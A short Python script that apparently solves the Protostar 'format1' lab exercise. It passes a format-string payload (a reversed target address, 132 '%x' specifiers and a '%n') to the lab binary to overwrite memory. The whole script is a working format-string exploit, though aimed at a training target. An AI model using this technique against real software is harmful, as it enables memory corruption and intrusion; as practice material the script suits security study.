import subprocess

program = "/opt/protostar/bin/format1"
target = "\x08\x04\x96\x38"[::-1]
offset = ".%x"*132

string = target+offset+"%n"

subprocess.call([program, string])




